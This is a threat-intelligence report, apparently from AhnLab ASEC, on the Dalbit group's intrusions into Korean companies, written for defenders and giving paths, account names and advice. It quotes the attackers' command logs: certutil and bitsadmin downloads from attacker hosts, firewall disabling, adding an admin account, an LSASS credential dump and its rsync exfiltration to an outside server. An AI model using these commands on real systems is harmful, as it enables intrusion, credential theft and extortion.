Dalbit (m00nlight): Chinese Hacker Group’s APT Attack Campaign
asec.ahnlab.com/en/47455
By kingkimgim

February 13, 2023

0. Overview
This report is a continuation of the “Attackers Using FRP (Fast Reverse Proxy) to Attack Korean Companies” post that was uploaded on August
16, 2022 and follows the group’s activities since that post.
This group has always relied on open-source tools and lacked any distinct characteristics to profile them due to the lack of PDB information.
Additionally, the amount of information that could be collected was limited unless the affected Korean companies specifically asked for an
investigation since the threat actor’s C2 (Command&Control) server abused the servers of the Korean companies. However, after the post was
uploaded and a portion of the Korean company servers used by the threat actor were blocked, the threat actor began to use a hosting server
called “*.m00nlight.top” as their C2 and download server. Thus, the ASEC team decided to call this group Dalbit (m00nlight.top) after the
Korean word for ‘Moonlight’.
This group has had more than 50 confirmed attack attempts on Korean companies since 2022. Most of the attacked companies were mid to
small companies while a portion was major companies. The team has confirmed that 30% of the infected companies were using a certain
Korean groupware solution. It is currently difficult to check whether this groupware product has a vulnerability or not, but if a server that is
this exposed has a vulnerability, then there is a chance that companies could be affected gravely through the leakage of confidential
information and ransomware behavior. Furthermore, this Dalbit group leaves some infected companies as proxies and download servers to
later use them as means to communicate with the threat actor upon infiltration of another company.
Therefore, we strongly recommend performing an internal security check if users suspect that they have been attacked by this Dalbit group.
The team asks that users send a report to AhnLab and take preemptive measures to prevent secondary harm and potential damage to other
companies.

1. Affected Korean Companies (Industry Type)
Listed below are the 50 companies that were confirmed to have been affected since 2022. Companies that have not been clearly confirmed were

2. Flow and Characteristics
2.1. Summary Diagram

Figure 2. Summary diagram of Dalbit group’s infiltration process

The above diagram shows the threat actor’s infiltration process into Company B. A brief summary of this flow is in the table below.
1) Initial Access
The threat actor targets web servers or SQL servers, which they gain access to by exploiting vulnerabilities. They then
attempt to control the systems with tools such as WebShell.
2) Command & Control
Various hacking tools are downloaded through WebShell. Hacking tools include various binaries such as privilege escalation
tools, proxy tools, and network scanning tools.
3) Proxy & Internal Reconnaissance
Proxy: The threat actor installs a proxy tool such as FRP (Fast Reverse Proxy) before attempting to connect to 2-1) a hosting
server built by the threat actor or 2-2) another previously infected company’s server (Company A) via Remote Desktop (RDP).
Internal Reconnaissance: Tools such as network scanning tools and account theft tools are used for internal reconnaissance
and obtaining information.
4) Lateral Movement
The obtained information is used to move to another connectible server or PC. Afterward, a proxy tool (FRP) is also installed
on the PC that has successfully been reached through lateral movement, creating an environment which allows the threat
actor to connect via RDP. The required privilege level is then acquired by either adding a specific account or through a
credential theft tool like Mimikatz.
5) Impact
Ultimately, after the threat actor steals all the information they desire, they use BitLocker to lock certain drives and demand a
ransom.

Table 3. Malware and hacking tools used by Dalbit

Only one tool for leaking emails seems to have been made by the group themselves. The rest are normal Windows programs or tools that can
easily be found online.

3.2. Infiltration Process
3.2.1. Initial Infiltration
It is assumed that their attack targets are usually servers with a specific Korean groupware installed on them, email servers (Exchange Server),
and SQL servers. The threat actor exploited either file upload vulnerabilities or WebLogic vulnerabilities such as CVE-2017-10271 to upload
their WebShell. A portion appeared to have used a SQL server command prompt (xp_cmdshell).
The most frequently used WebShells are Godzilla, ASPXSpy, AntSword, and China Chopper in that order. Aside from these, several other
WebShells were also found.
The installation paths of the WebShells are as follows.

Table 4. Paths where WebShells were uploaded

3.2.2. Download
The threat actor downloads other hacking tools through default Windows programs. Since WebShells are normally used in infiltration, parent
processes, excluding command processes like cmd, are run by web server processes such as w3wp.exe, java.exe, sqlserver.exe, and
tomcat*.exe. The downloaded files include privilege escalation tools, proxy tools, and network scanning tools, all of which are required by the
threat actor. The download command is as follows.
(Additionally, the full addresses of the Korean companies that have been exploited will not be disclosed.)
1) Certutil
> certutil -urlcache -split -f hxxp://www.ive***.co[.]kr/uploadfile/ufaceimage/1/update.zip c:\programdata\update.exe (frpc)
> certutil -urlcache -split -f hxxp://121.167.***[.]***/temp/8.txt c:\programdata\8.ini (frpc.ini)
> certutil -urlcache -split -f hxxp://103.118.42[.]208:8080/frpc.exe frpc.exe
…
Table 5. Certutil download log

2) Bitsadmin
> bitsadmin /transfer mydownloadjob /download /priority normal “hxxp://91.217.139[.]117:8080/calc32.exe”
“c:\windows\debug\winh32.exe” (frpc)
> bitsadmin /transfer mydownloadjob /download /priority normal “hxxp://91.217.139[.]117:8001/log.ini”
“c:\windows\debug\log.ini” (frpc.ini)
…
Table 6. Bitsadmin download log

4/17

The hacking tools and malware downloaded by the threat actor were usually found in the following paths.
%ALLUSERSPROFILE%
%SystemDrive%\temp
%SystemDrive%\perflogs
%SystemDrive%\nia
%SystemDrive%\.tmp
%SystemRoot%
%SystemRoot%\debug
%SystemRoot%\temp
Table 7. Major directories used by the Dalbit group

Therefore, the files in these paths should be checked if users suspect that they have been infiltrated.
3.2.3. Privilege Escalation and Account Addition
The threat actor mainly used Potato (BadPotato, JuicyPotato, SweetPotato, RottenPotato, EFSPotato) and PoC (CVE-2018-8639, CVE-20191458), which has been published on GitHub, for privilege escalation. After privilege escalation, they characteristically add the following
account.
The below sp.exe is the SweetPotato tool.
> sp.exe “whaomi” (Privilege check)
> sp.exe “netsh advfirewall set allprofiles state off” (Firewall OFF)
> sp.exe “net user main ff0.123456 /add & net localgroup administrators main /add” (Add account)
Table 8. SweetPotato usage log

The point of focus here is the name of the account added by the threat actor. Threat actor accounts with the name “main” have been found in
other infiltrated company servers.
Aside from adding accounts, the threat actor would also use stolen admin accounts.
> wmic /node:127.0.0.1 /user:storadmin /password:r*****1234!@#$ process call create “cmd.exe /c c:\temp\s.bat”
Table 9. Admin account execution log

3.2.4. Proxy Settings
After infiltrating a server, the threat actor initiates access via proxy to use RDP communications. FRP and LCX were the mainly used proxy
tools, and there have been cases where ReGeorg, NPS, or RSOCKS was found in some companies. Additionally, multiple proxy tools including
FRP and LCX were found in one area of a certain company that was infiltrated. Multiple FRP configuration files (.ini) would also be discovered
in cases where internal propagation had occurred. We believe that the threat actor installs additional FRPs and uses multiple configuration
files when an accessible PC has a lot to gain. Furthermore, the LCX used by this group has the same features as the open-source LCX, but its
version is not the same as the one uploaded to GitHub, meaning that a binary that was arbitrarily compiled by a Chinese person was used.
Proxy tools like FRP and LCX differ in terms of forwarding methods and supported protocols. However, since their differences, actual infection
cases, recreation, and network packets have all been covered in the TI report, “Analysis Report on Attack Cases Exploiting Various Remote
Control Tools,” they will not be reiterated in this post.
1) FRP(FAST REVERSE PROXY)

FRP configuration files (.ini) were found in all servers and PC devices infiltrated by this group. The following is an actual case of an infiltrated
company.

Figure 3. FRPC configuration file (m00nlight.top) found in an infiltrated company

In particular, the Dalbit group usually used the Socks5 protocol to communicate. The Socks5 protocol is a layer 5 protocol in the 7 OSI layers. It
can handle various requests such as HTTP, FTP, and RDP since it is between layer 4 and 7. Therefore, if the threat actor uses a proxy
connection tool that can handle Socks5, such as Proxifier, remote control through RDP becomes possible. If a connection can be established to
an internal PC, lateral movement can also be achieved. Thus, if the configuration file is set as a Socks5 protocol, the threat actor will have more
freedom as additional modifications will no longer be required to handle various requests.

The following are FRP filenames and commands used by the threat actor. The list is in a descending order from most to least used.
FRP filenames
update.exe
debug.exe
main.exe
info.exe
Agent.exe
frpc.exe
test.exe
zabbix.exe
winh32.exe

> debug.exe -c debug.log
> debug.exe -c debug.txt
> frpc.exe -c frpc__2381.ini
> cmd.exe /c c:\temp\****\temp\frpc.ini
…
Table 11. FRP execution log

In certain companies, the FRP was registered to the task scheduler (schtasks) under the name “debug” to maintain its persistence. As shown in
Table 12, the team confirmed the execution of a registered scheduler.

> schtasks /tn debug /run
Table 12. Task scheduler execution log
2) LCX(HTRAN)

Dalbit used an LCX (Htran) binary compiled by a certain Chinese person. This has the same features as the existing binary, but it also includes
the nickname of the binary creator.

Figure 5. Screen that is displayed upon executing the LCX used by the Dalbit group (By 折羽鸿鹄)

We can confirm through this that the nickname of the person who had created the binary is “折羽鸿鹄” (QQ:56345566). It is highly unlikely
that this developer is the threat actor in question; however, since this binary cannot be downloaded through a simple search online, it is
assumed that the threat actor has a connection to China.
The installed filenames and executables are as follows:
LCX filenames
lcx3.exe
lcx.exe
update.exe
Table 13. LCX filenames

LCX commands
> update.exe -slave 1.246.***.*** 110 127.0.0.1 3389
> lcx3.exe -slave 222.239.***.*** 53 127.0.0.1 3389
…
Table 14. LCX command log

The above LCX C2 is a Korean company server and has been concealed.
3.2.5. Internal Reconnaissance
Fscan and NBTScan have been commonly used for network scans, but the usage of TCP Scan and Goon have also been confirmed for some
cases.
Goon is a network scanning tool made with Golang that not only allows basic port scanning, but scanning for Tomcat, MSSQL, and MYSQL
accounts as well. We can see that this tool was also made in Chinese.

7/17

Figure 6. Screen that is displayed upon executing Goon

3.2.6. Information Extortion
LSASS Dump information and EML files of certain accounts are usually the information that is stolen. It has been confirmed that installed
programs are checked through a WMIC command or a screenshot of the affected PC is sent to the threat actor’s server at regular intervals
according to the companies.
1) Credential Extraction (LSASS Dump)

According to the target, the threat actor would choose to not install Mimikatz and attempt to extract credentials instead. This is a method that
dumps the Lsass.exe process. Credential information can be obtained from a PC with tools like Mimikatz or Pypykatz since they can be found
within the dump file. Additionally, a detailed explanation of Mimikatz can be found in the TI report, “Analysis Report on Internal Web
Spreading Methods Using Mimikatz“.
The following method is how the threat actor stole credentials without Mimikatz.
1-1) Dumpert
Open-source Dumpert is an API hooking evasion tool that operates according to the target OS system and uses the MiniDumpWriteDump()
API to dump the lsass.exe process. The threat actor modified the code to change the path of the dump file and remove features like log output.

Figure 7. Left (open-source Dumpert) vs. right (Dumper used by the Dalbit group)

8/17

The above figure shows that the two versions are the same aside from the different paths and the removal of the output string.
The following table displays all of the “%SystemRoot%\temp” dump file paths that have currently been found.
%SystemRoot%\temp\duhgghmpert.dmp
%SystemRoot%\temp\dumpert.dmp
%SystemRoot%\temp\tarko.dmp
%SystemRoot%\temp\lsa.txt
…
Table 15. Lsass dump file paths

1-2 ) Procdump
Procdump is a normal utility program provided by Microsoft and offers the process dump feature. The threat actor performed a dump like the
one in Figure 8 with this tool.

Figure 8. Output upon executing Procdump

Afterward, the threat actor used a tool called Rsync (Remote Sync) to send the dump file to their own server. The following is an actual example
of information theft attempted by the threat actor.
> svchost.exe -accepteula -ma lsass.exe web_log.dmp
> rsync -avz –port 443 web_log.zip test@205.185.122[.]95::share/web_log.zip
Table 16. Procdump execution and rsync usage log
2) Email Extraction

Figure 9. Screen displayed upon executing email extraction tool

This sample is an email extraction tool developed with Golang and presumably the only known tool developed by the threat actor themselves.
This tool offers the ability to target a company’s Exchange email server and extract a specific account’s email with EWS (Exchange Web
Service) as an EML file. Arguments include the Exchange server address, account name, NTLM password hash of said account, date and time,
etc. When launched, the tool extracts every email from the mailboxes of the target account according to the time received as an argument and
saves them as an EML file.
For reference, the PDB information of this binary is “fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff”and is meaningless.

3) Screen Leak

The threat actor sent screenshots from certain PCs to their own server. While a binary that takes screenshots of the current screen has not been
found as of yet, the threat actor’s server where the infected PC’s screenshots were being sent has been discovered. Screenshots from a certain
company’s infiltrated PC sent pictures every 5-10 seconds.
Outgoing server of threat actor’s screenshots: hxxp://91.217.139[.]117:8080/1.bat

10/17

Figure 11. Actual PC screenshot sent from a certain affected company

Only images were sent. The PC could not be controlled remotely and no audio was outputted either.
Also, the threat actor’s server (91.217.139[.]117) where the screenshots were being sent was also being used as a download server for another
company.

3.2.7. File Encryption
Details about this matter have been covered in a past blog post. The threat actor used BitLocker, a Windows utility, to encrypt certain drives
and demand ransoms. Currently, more affected companies are still being found.
BitLocker commands

Table 21. BitLocker log

Figure 13 is the ransom note used by the threat actor. The threat actor used anonymous mailing services such as startmail.com and
onionmail.com.

Figure 13. Ransom note that was shown in a previous blog post

The command assumed to be for downloading the ransom note is as follows.
> certutil -urlcache -split -f hxxp://175.24.32[.]228:8888/readme c:\windows\temp\readme

3.2.8. Evasion
1) VMPROTECT PACKING

When the binary was detected after being uploaded, the threat actor packed it with VMProtect to try and avoid detection.

4. Conclusion
The Dalbit hacking group attempted attacks against vulnerable Korean company servers, and logs are being reported not only from mid-sized
and smaller businesses, but also from some large companies. In particular, 30% of the affected companies were found to have been using a
certain Korean groupware product. Moreover, this group uses publicly available tools, from the WebShell used in the early stages to the
ransomware used at the end. Among these tools, there is a proxy tool that is assumed to have been obtained from a Chinese community, a tool
with Chinese documentation, and a Chinese tool not mentioned in this post. It can be assumed that the threat actor has at least a partial
connection with China, considering their frequent usage of Chinese tools.
If a server admin suspects that their system has been infected, they are advised to check their IOC along with the aforementioned download
paths and account name (“main”) often used by the threat actor. If suspicions are confirmed, then it is advised to immediately report your
situation to AhnLab in order to minimize additional harm. Furthermore, admins should prevent vulnerability attacks by updating their servers
to the newest version for vulnerability patches, and maintenance is especially needed for servers that are open externally but not managed.

5. IOC
For reference, the IP addresses of Korean company servers abused by the threat actor will not be disclosed on the ASEC blog.
